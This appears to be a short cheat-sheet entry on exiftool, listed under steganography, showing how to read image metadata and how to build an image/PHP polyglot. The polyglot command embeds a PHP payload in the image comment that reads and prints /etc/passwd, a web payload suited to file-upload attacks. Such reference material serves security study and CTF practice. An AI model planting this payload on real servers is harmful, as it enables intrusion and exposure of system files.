---
title: Exiftool
desc: Read and write meta information in files. It’s also used to create a polyglot. 
tags: [Linux, Steganography]
alts: [Binwalk, Steghide, Stegseek, Xxd, Zsteg]
website:
render_with_liquid: false
---

## Read meta information

```sh
exiftool example.jpg
```

<br />

## Create a polyglot

```sh
exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" example.jpg -o polyglot.php
```